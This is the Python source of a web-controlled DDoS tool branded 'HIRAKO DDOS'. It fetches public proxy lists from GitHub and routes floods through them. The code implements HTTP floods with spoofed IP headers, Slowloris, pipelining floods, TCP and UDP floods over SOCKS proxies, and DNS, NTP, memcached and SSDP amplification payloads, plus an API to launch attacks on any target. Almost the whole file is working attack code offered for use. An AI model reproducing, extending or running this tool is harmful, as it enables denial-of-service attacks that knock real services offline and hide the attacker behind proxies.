from flask import Flask, render_template, request, jsonify, send_file
import threading
import time
import random
import uuid
import requests
import socket
import ssl
from urllib.parse import urlparse
import concurrent.futures
from flask_cors import CORS
import os
import sys

# ========= PROXY MODULES =========
try:
    import socks
    SOCKS_AVAILABLE = True
except ImportError:
    SOCKS_AVAILABLE = False
    print("[!] PySocks not installed. Install with: pip install PySocks")

app = Flask(__name__)
CORS(app)

# Store active attacks
active_attacks = {}
attack_logs = {}
attack_stats = {}

# Proxy storage
proxy_lists = {
    'http': [],
    'https': [],
    'socks4': [],
    'socks5': []
}
proxy_index = 0
proxy_lock = threading.Lock()

# Warna ANSI untuk console
R = "\033[31m"
G = "\033[32m"
Y = "\033[33m"
C = "\033[36m"
W = "\033[0m"

BANNER = f"""
{C}  _   _ _           _           ____      _           
 | | | (_)_ __ __ _| | _____   |  _ \\  __| | ___  ___ 
 | |_| | | '__/ _` | |/ / _ \\  | | | |/ _` |/ _ \\/ __|
 |  _  | | | | (_| |   < (_) | | |_| | (_| | (_) \\__ \\
 |_| |_|_|_|  \\__,_|_|\\_\\___/  |____/ \\__,_|\\___/|___/

           {Y}HIRAKO DDOS - ULTIMATE PROXY EDITION{W}
"""

print(BANNER)
print(C + "=" * 60 + W)

# ========= PROXY FUNCTIONS =========
def fetch_proxies_from_github():
    """Fetch proxies from multiple GitHub raw sources"""
    global proxy_lists
    
    sources = {
        'http': [
            "https://raw.githubusercontent.com/zloi-user/hideip.me/main/http.txt",
            "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt"
        ],
        'https': [
            "https://raw.githubusercontent.com/zloi-user/hideip.me/main/https.txt",
            "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/https.txt"
        ],
        'socks4': [
            "https://raw.githubusercontent.com/zloi-user/hideip.me/main/socks4.txt",
            "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/socks4.txt"
        ],
        'socks5': [
            "https://raw.githubusercontent.com/zloi-user/hideip.me/main/socks5.txt",
            "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/socks5.txt"
        ]
    }
    
    for proxy_type, urls in sources.items():
        proxy_lists[proxy_type] = []
        for url in urls:
            try:
                response = requests.get(url, timeout=10)
                if response.status_code == 200:
                    for line in response.text.splitlines():
                        line = line.strip()
                        if line and not line.startswith('#'):
                            parts = line.split(':')
                            if len(parts) >= 2:
                                ip = parts[0]
                                port = parts[1].split(':')[0]
                                proxy_lists[proxy_type].append(f"{proxy_type}://{ip}:{port}")
                    print(f"{G}[+] Loaded {len(proxy_lists[proxy_type])} {proxy_type.upper()} proxies{W}")
            except Exception as e:
                print(f"{R}[!] Failed fetch {proxy_type} from {url}: {e}{W}")
        
        proxy_lists[proxy_type] = list(set(proxy_lists[proxy_type]))[:500]
    
    total = sum(len(p) for p in proxy_lists.values())
    print(f"{G}[+] Total proxies loaded: {total}{W}")

def get_next_proxy(proxy_type='mixed'):
    """Get next proxy with rotation"""
    global proxy_index
    
    if proxy_type == 'mixed':
        available = []
        for ptype, plist in proxy_lists.items():
            if plist:
                available.extend([(p, ptype) for p in plist])
        if not available:
            return None
        with proxy_lock:
            proxy, ptype = available[proxy_index % len(available)]
            proxy_index += 1
        return proxy
    else:
        plist = proxy_lists.get(proxy_type, [])
        if not plist:
            return None
        with proxy_lock:
            proxy = plist[proxy_index % len(plist)]
            proxy_index += 1
        return proxy

def create_proxies_dict(proxy_url):
    """Create proxies dict for requests library"""
    if not proxy_url:
        return None
    return {
        'http': proxy_url,
        'https': proxy_url
    }

def create_socks_connection(host, port, proxy_type='socks5', timeout=5):
    """Create SOCKS connection for TCP/UDP flooding"""
    if not SOCKS_AVAILABLE:
        return None
    
    proxy_url = get_next_proxy(proxy_type)
    if not proxy_url:
        return None
    
    try:
        parts = proxy_url.replace(f"{proxy_type}://", "").split(':')
        proxy_ip = parts[0]
        proxy_port = int(parts[1])
        
        s = socks.socksocket()
        if proxy_type == 'socks4':
            s.set_proxy(socks.SOCKS4, proxy_ip, proxy_port)
        else:
            s.set_proxy(socks.SOCKS5, proxy_ip, proxy_port)
        s.settimeout(timeout)
        s.connect((host, port))
        return s
    except:
        return None

# ========= AMPLIFICATION ATTACKS =========
def udp_amplification_flood(host, port, attack_type='dns'):
    """UDP amplification using public resolvers"""
    payloads = {
        'dns': b'\x00\x00\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00\x03www\x07example\x03com\x00\x00\x01\x00\x01',
        'ntp': b'\x17\x00\x03\x2a' + b'\x00' * 4,
        'memcached': b'\x00\x00\x00\x00\x00\x01\x00\x00stats\r\n',
        'ssdp': b'M-SEARCH * HTTP/1.1\r\nHOST: 239.255.255.250:1900\r\nMAN: "ssdp:discover"\r\nMX: 2\r\nST: ssdp:all\r\n\r\n',
    }
    payload = payloads.get(attack_type, payloads['dns'])
    
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        sock.sendto(payload * 2, (host, port))
        sock.close()
        return {'success': True, 'size': len(payload) * 2, 'amplified': True}
    except:
        return {'success': False, 'error': 'UDP amplification failed'}

def slowloris_attack(host, port):
    """Slowloris - keep connections open forever"""
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(10)
        sock.connect((host, port))
        sock.send(b"GET / HTTP/1.1\r\n")
        sock.send(f"Host: {host}\r\n".encode())
        sock.send(b"User-Agent: Mozilla/5.0\r\n")
        sock.send(f"X-Header-{random.randint(1,9999)}: {random.randint(1,999999)}\r\n".encode())
        return {'success': True, 'size': 50, 'slowloris': True}
    except:
        return {'success': False, 'error': 'Slowloris failed'}

def http_pipeline_flood(url, headers):
    """HTTP/1.1 pipelining - multiple requests in one connection"""
    proxy_url = get_next_proxy('mixed')
    proxies = create_proxies_dict(proxy_url) if proxy_url else None
    
    try:
        session = requests.Session()
        if proxies:
            session.proxies.update(proxies)
        
        headers['Range'] = f'bytes=0-{random.randint(10000, 99999)}'
        
        for i in range(random.randint(3, 10)):
            req = requests.Request('GET', url, headers=headers)
            session.send(session.prepare_request(req), timeout=2, stream=False)
        
        session.close()
        return {'success': True, 'size': 5000, 'pipelined': True}
    except:
        return {'success': False, 'error': 'Pipeline failed'}

# ========= ATTACK FUNCTIONS WITH PROXY =========
def http_flood_with_proxy(url, headers, timeout=5):
    """HTTP flood using proxy rotation"""
    proxy_url = get_next_proxy('mixed')
    proxies = create_proxies_dict(proxy_url) if proxy_url else None
    
    try:
        method = random.choice(['GET', 'POST', 'HEAD', 'OPTIONS', 'PUT', 'DELETE'])
        
        if method == 'POST':
            data = f"data={random.randint(1, 999999)}&ts={time.time()}&r={random.random()}"
            response = requests.post(url, headers=headers, data=data, 
                                     timeout=timeout, verify=False, proxies=proxies)
        else:
            response = requests.request(method, url, headers=headers, 
                                       timeout=timeout, verify=False, proxies=proxies)
        
        return {
            'success': True,
            'status': response.status_code,
            'size': len(response.content),
            'proxy': proxy_url if proxy_url else "Direct"
        }
    except Exception as e:
        return {
            'success': False, 
            'error': str(e)[:50], 
            'proxy': proxy_url if proxy_url else "Direct"
        }

def tcp_flood_with_proxy(host, port, use_socks=True):
    """TCP flood using SOCKS proxy"""
    if use_socks and SOCKS_AVAILABLE:
        proxy_type = random.choice(['socks4', 'socks5'])
        sock = create_socks_connection(host, port, proxy_type, timeout=3)
        if sock:
            try:
                data = os.urandom(random.randint(64, 2048))
                sock.send(data)
                sock.close()
                return {'success': True, 'size': len(data), 'proxy': f'{proxy_type}://proxy'}
            except:
                pass
    
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(2)
        sock.connect((host, port))
        data = os.urandom(random.randint(64, 2048))
        sock.send(data)
        sock.close()
        return {'success': True, 'size': len(data), 'proxy': 'Direct'}
    except:
        return {'success': False, 'error': 'TCP failed', 'proxy': 'Direct'}

def udp_flood_with_proxy(host, port, use_socks=True):
    """UDP flood using SOCKS proxy"""
    if use_socks and SOCKS_AVAILABLE:
        proxy_url = get_next_proxy('socks5')
        if proxy_url:
            try:
                parts = proxy_url.replace("socks5://", "").split(':')
                proxy_ip = parts[0]
                proxy_port = int(parts[1])
                
                sock = socks.socksocket(socket.AF_INET, socket.SOCK_DGRAM)
                sock.set_proxy(socks.SOCKS5, proxy_ip, proxy_port)
                data = os.urandom(random.randint(64, 2048))
                sock.sendto(data, (host, port))
                sock.close()
                return {'success': True, 'size': len(data), 'proxy': proxy_url}
            except:
                pass
    
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        data = os.urandom(random.randint(64, 2048))
        sock.sendto(data, (host, port))
        sock.close()
        return {'success': True, 'size': len(data), 'proxy': 'Direct'}
    except:
        return {'success': False, 'error': 'UDP failed', 'proxy': 'Direct'}

# ========= GENERATORS =========
def generate_fake_ip():
    return ".".join(str(random.randint(1, 255)) for _ in range(4))

def generate_fake_isp():
    isps = ["IndiHome", "Telkomsel", "XL Axiata", "3 Indonesia", "Smartfren", 
            "Biznet", "First Media", "MyRepublic", "CBN", "MNC Play", "Orange", 
            "Vodafone", "AT&T", "Verizon", "T-Mobile", "Sprint", "China Mobile",
            "Singtel", "StarHub", "Maxis", "Digi", "Airtel", "Jio", "BSNL"]
    return random.choice(isps)

def generate_fake_network():
    networks = ["4G LTE", "5G", "Fiber Optic", "ADSL", "Wi-Fi 6", "Satellite", 
                "Cable", "3G", "4G+", "5G mmWave", "Ethernet", "Microwave", 
                "Leased Line", "Metro Ethernet", "Starlink"]
    return random.choice(networks)

# ========= MAIN ATTACK FUNCTION =========
def run_attack(attack_id, params):
    target = params.get('target', '')
    port = params.get('port', '')
    mode = params.get('mode', '1')
    req_count = params.get('reqCount')
    concurrency = int(params.get('concurrency', 10))
    logging_enabled = params.get('logging') == 'Y'
    attack_type = params.get('attack_type', 'http')
    use_proxy = params.get('use_proxy', 'Y') == 'Y'
    intensity = params.get('intensity', 'normal')
    strategy = params.get('strategy', 'mixed')
    
    # Format target
    if not target.startswith(('http://', 'https://')):
        target = 'http://' + target
    
    if port and ':' not in target.split('//')[1]:
        parts = target.split('//')
        target = f"{parts[0]}//{parts[1].split('/')[0]}:{port}"
    
    parsed = urlparse(target)
    host = parsed.hostname or target.replace('http://', '').replace('https://', '').split(':')[0]
    port_num = int(port) if port else (443 if parsed.scheme == 'https' else 80)
    
    # Intensity boost
    if intensity == 'extreme':
        concurrency = min(concurrency * 3, 1000)
        print(f"{R}[!] EXTREME MODE - Concurrency boosted to {concurrency}{W}")
    elif intensity == 'high':
        concurrency = min(concurrency * 2, 800)
        print(f"{Y}[!] HIGH MODE - Concurrency boosted to {concurrency}{W}")
    
    semaphore = threading.Semaphore(concurrency)
    request_count = 0
    max_requests = 999999 if mode == '1' else int(req_count or 100)
    
    import urllib3
    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
    
    def worker():
        nonlocal request_count
        
        with semaphore:
            if not active_attacks.get(attack_id, {}).get('active', False):
                return
            
            fake_ip = generate_fake_ip()
            fake_isp = generate_fake_isp()
            fake_network = generate_fake_network()
            
            headers = {
                "User-Agent": random.choice([
                    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
                    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36",
                    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36",
                    "Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X) AppleWebKit/605.1.15",
                ]),
                "Accept": "*/*",
                "Accept-Language": random.choice(["en-US,en;q=0.9", "id-ID,id;q=0.9"]),
                "Accept-Encoding": "gzip, deflate, br",
                "Connection": "keep-alive",
                "Cache-Control": "no-cache",
                "X-Forwarded-For": fake_ip,
                "Client-IP": fake_ip,
                "X-Real-IP": fake_ip,
                "X-Network-Type": fake_network,
                "X-ISP-Name": fake_isp,
            }
            
            # Strategy selection
            current_strategy = strategy
            if strategy == 'mixed':
                current_strategy = random.choice(['http', 'slowloris', 'amplification', 'pipeline', 'tcp', 'udp'])
            
            result = None
            try:
                if current_strategy == 'slowloris':
                    result = slowloris_attack(host, port_num)
                elif current_strategy == 'amplification':
                    amp_type = random.choice(['dns', 'ntp', 'memcached', 'ssdp'])
                    result = udp_amplification_flood(host, port_num, amp_type)
                elif current_strategy == 'pipeline':
                    result = http_pipeline_flood(target, headers)
                elif current_strategy == 'tcp':
                    result = tcp_flood_with_proxy(host, port_num, use_proxy)
                elif current_strategy == 'udp':
                    result = udp_flood_with_proxy(host, port_num, use_proxy)
                else:
                    result = http_flood_with_proxy(target, headers)
                
                # Extreme mode: double packet
                if intensity == 'extreme' and result.get('success'):
                    if current_strategy == 'http':
                        http_flood_with_proxy(target, headers)
                    elif current_strategy in ['tcp', 'udp']:
                        tcp_flood_with_proxy(host, port_num, use_proxy)
                        
            except Exception as e:
                result = {'success': False, 'error': str(e), 'proxy': 'Error'}
            
            # Update stats
            if result and result.get('success'):
                attack_stats[attack_id]['total'] += 1
                attack_stats[attack_id]['success'] += 1
                attack_stats[attack_id]['bytes_sent'] += result.get('size', 0)
                
                if logging_enabled:
                    proxy_info = f"Proxy: {result.get('proxy', 'Unknown')}"
                    log_msg = f"✅ [{current_strategy.upper()}] {host} | Status: OK | {proxy_info} | Size: {result.get('size', 0)}B"
                    attack_logs[attack_id].append(log_msg)
                    print(f"{G}{log_msg}{W}")
            else:
                attack_stats[attack_id]['total'] += 1
                attack_stats[attack_id]['failed'] += 1
                
                if logging_enabled:
                    error_msg = result.get('error', 'Unknown') if result else 'Failed'
                    proxy_info = f"Proxy: {result.get('proxy', 'Unknown') if result else 'N/A'}"
                    log_msg = f"❌ [{current_strategy.upper()}] {host} | Status: FAIL | {proxy_info} | Error: {error_msg}"
                    attack_logs[attack_id].append(log_msg)
                    print(f"{R}{log_msg}{W}")
    
    print(f"{Y}[!] Attack started: {attack_id} | Type: {attack_type} | Strategy: {strategy} | Intensity: {intensity}{W}")
    
    try:
        with concurrent.futures.ThreadPoolExecutor(max_workers=concurrency) as executor:
            futures = []
            while (active_attacks.get(attack_id, {}).get('active', False) and 
                   request_count < max_requests):
                
                for _ in range(min(concurrency, max_requests - request_count)):
                    future = executor.submit(worker)
                    futures.append(future)
                    request_count += 1
                
                futures = [f for f in futures if not f.done()]
                time.sleep(0.001)
                
                if request_count % 100 == 0:
                    stats = attack_stats[attack_id]
                    print(f"{C}[{attack_id}] Progress: {request_count}/{max_requests} | "
                          f"Success: {stats['success']} | Failed: {stats['failed']}{W}")
            
            for future in futures:
                future.result(timeout=1)
    except Exception as e:
        print(f"{R}[!] Error: {e}{W}")
    
    if attack_id in active_attacks:
        active_attacks[attack_id]['active'] = False
    
    stats = attack_stats.get(attack_id, {})
    print(f"\n{G}[!] Attack completed: {attack_id} | Total: {stats.get('total', 0)} | "
          f"Success: {stats.get('success', 0)} | Failed: {stats.get('failed', 0)}{W}")

# ========= FLASK ROUTES =========
@app.route('/')
def index():
    return render_template('index.html')

@app.route('/api/attack', methods=['POST'])
def handle_attack():
    data = request.json
    action = data.get('action')
    
    if action == 'start':
        attack_id = str(uuid.uuid4())[:8]
        target = data.get('target', '').strip()
        if not target:
            return jsonify({'success': False, 'error': 'Target required'})
        
        concurrency = min(max(int(data.get('concurrency', 10)), 1), 500)
        intensity = data.get('intensity', 'normal')
        if intensity == 'extreme':
            concurrency = min(concurrency, 1000)
        
        active_attacks[attack_id] = {'active': True, 'start_time': time.time()}
        attack_stats[attack_id] = {'total': 0, 'success': 0, 'failed': 0, 'bytes_sent': 0}
        attack_logs[attack_id] = []
        
        thread = threading.Thread(target=run_attack, args=(attack_id, data))
        thread.daemon = True
        thread.start()
        
        return jsonify({'success': True, 'attackId': attack_id})
    
    elif action == 'stop':
        attack_id = data.get('id')
        if attack_id in active_attacks:
            active_attacks[attack_id]['active'] = False
        return jsonify({'success': True})
    
    return jsonify({'success': False, 'error': 'Invalid action'})

@app.route('/api/attack', methods=['GET'])
def get_stats():
    attack_id = request.args.get('id')
    if attack_id in active_attacks:
        return jsonify({
            'success': True,
            'stats': attack_stats.get(attack_id, {}),
            'logs': attack_logs.get(attack_id, [])[-100:]
        })
    return jsonify({'success': False, 'error': 'Not found'})

@app.route('/api/logs/<attack_id>', methods=['GET'])
def download_logs(attack_id):
    if attack_id in attack_logs:
        filename = f"hirako_logs_{attack_id}.txt"
        with open(filename, 'w') as f:
            f.write('\n'.join(attack_logs[attack_id]))
        return send_file(filename, as_attachment=True)
    return jsonify({'error': 'Logs not found'}), 404

@app.route('/api/proxy/reload', methods=['POST'])
def reload_proxies():
    threading.Thread(target=fetch_proxies_from_github).start()
    return jsonify({'success': True, 'message': 'Reloading proxies...'})

@app.route('/api/proxy/stats', methods=['GET'])
def proxy_stats():
    total = sum(len(p) for p in proxy_lists.values())
    types = {}
    for ptype, plist in proxy_lists.items():
        if plist:
            types[ptype] = len(plist)
    
    return jsonify({
        'success': True,
        'total': total,
        'types': types
    })

if __name__ == '__main__':
    fetch_proxies_from_github()
    app.run(host='0.0.0.0', port=8010, debug=True, threaded=True)